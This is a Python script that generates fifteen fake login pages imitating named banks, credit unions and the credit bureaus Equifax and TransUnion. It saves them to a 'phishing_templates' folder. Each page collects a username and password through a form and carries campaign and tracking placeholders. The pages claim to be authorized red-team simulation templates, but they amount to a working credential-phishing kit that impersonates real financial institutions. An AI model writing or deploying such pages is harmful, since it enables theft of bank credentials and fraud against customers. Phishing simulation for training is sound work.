#!/usr/bin/env python3
"""Build remaining bank login pages."""
import os

HOME = "C:/Users/mobil/OneDrive/Desktop/bionic_daughter_agent"
TEMPLATE_DIR = os.path.join(HOME, "tools", "phishing_templates", "banking")

banks = [
    ("synchrony_login.html", "Synchrony", "Synchrony Bank"),
    ("discover_login.html", "Discover", "Discover Bank"),
    ("barclays_login.html", "Barclays", "Barclays Bank"),
    ("nationwide_login.html", "Nationwide", "Nationwide Building Society"),
    ("td_canada_trust_login.html", "TD Canada Trust", "TD Bank Group"),
    ("rbc_login.html", "RBC", "Royal Bank of Canada"),
    ("scotiabank_login.html", "Scotiabank", "Scotiabank"),
    ("cibc_login.html", "CIBC", "Canadian Imperial Bank of Commerce"),
    ("desjardins_login.html", "Desjardins", "Desjardins Groupe"),
    ("bmo_login.html", "BMO", "Bank of Montreal"),
    ("equifax_login.html", "Equifax", "Equifax Inc."),
    ("transunion_login.html", "TransUnion", "TransUnion LLC"),
    ("north_fork_credit_union_login.html", "North Fork CU", "North Fork Credit Union"),
    ("penfed_login.html", "PenFed", "Pentagon Federal Credit Union"),
    ("alliant_credit_union_login.html", "Alliant CU", "Alliant Credit Union"),
]

for file, short_name, full_name in banks:
    html = f"""<!-- 
  Template: {file}
  Category: banking
  Description: {full_name} online banking/login (training/red team simulation only)
  Disclaimer: FOR AUTHORIZED RED TEAM USE ONLY — This is a simulation template.
-->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign On — {full_name}</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
       background: #003b71; min-height: 100vh; display: flex;
       align-items: center; justify-content: center; }}
.container {{ background: white; border-radius: 8px; box-shadow: 0 12px 40px rgba(0,0,0,0.3);
            padding: 36px; width: 100%; max-width: 420px; }}
.header {{ text-align: center; margin-bottom: 24px; }}
.logo {{ font-size: 26px; font-weight: 800; color: #003b71; letter-spacing: -0.5px;
          margin-bottom: 2px; }}
.tagline {{ font-size: 13px; color: #555; }}
.security-note {{ background: #e8f0fe; border: 1px solid #b8d4fe; border-radius: 6px;
               padding: 12px 16px; font-size: 12px; color: #1a56c4; margin-bottom: 20px;
               line-height: 1.5; }}
.form-group {{ margin-bottom: 16px; }}
.label {{ display: block; font-size: 12px; color: #555; margin-bottom: 6px; font-weight: 500; }}
.input {{ width: 100%; padding: 10px 14px; border: 1.5px solid #ddd; border-radius: 6px;
         font-size: 15px; transition: border-color 0.2s; outline: none; background: #fafafa; }}
.input:focus {{ border-color: #003b71; background: white; }}
.forgot-row {{ text-align: center; margin-bottom: 18px; font-size: 13px; color: #555; }}
.forgot-link {{ color: #003b71; text-decoration: none; }}
.btn {{ width: 100%; padding: 12px; background: #003b71; color: white; border: none;
       border-radius: 6px; font-size: 15px; font-weight: 700; cursor: pointer;
       transition: background 0.2s; }}
.btn:hover {{ background: #002d5a; }}
.footer {{ margin-top: 16px; font-size: 11px; color: #999; text-align: center;
          padding-top: 14px; border-top: 1px solid #f0f0f0; line-height: 1.5; }}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="logo">{short_name}</div>
    <div class="tagline">Online Banking</div>
  </div>
  <div class="security-note">
    <strong>🔒 Security:</strong> {full_name} will never ask for your password,
    PIN, or security codes via email or phone. Always access your account directly
    through the official {full_name} website or app.
    Reference: {short_name.upper().replace(' ', '')}-SIM-{{campaign_id}}
  </div>
  <form method="post" action="/banking/{file.replace('.html', '_login')}">
    <div class="form-group">
      <label class="label" for="username">Username</label>
      <input class="input" type="text" id="username" name="username"
             placeholder="Enter your username" required
             value="{{username}}" autocomplete="username">
    </div>
    <div class="form-group">
      <label class="label" for="password">Password</label>
      <input class="input" type="password" id="password" name="password"
             placeholder="Enter your password" required
             value="{{password}}" autocomplete="current-password">
    </div>
    <div class="forgot-row">
      <a href="/register" class="forgot-link">Register</a>
      &nbsp;·&nbsp;
      <a href="/forgot-username" class="forgot-link">Forgot username or password?</a>
    </div>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <p class="footer">
    © {{year}} {full_name}. All rights reserved.<br>
    Training simulation template — not affiliated with {full_name}.<br>
    Reference: {short_name.upper().replace(' ', '')}-SIM-{{campaign_id}} | {{tracking_code}}
  </p>
</div>
<script>
console.log("Template: {file.replace('.html', '')} | Campaign: {{campaign_id}} | Tracking: {{tracking_code}}");
</script>
</body>
</html>
"""

    path = os.path.join(TEMPLATE_DIR, file)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html)
    print(f"CREATED: {file} ({full_name}) — {len(html)} bytes")

print(f"\nTotal: {len(banks)} additional login pages created")
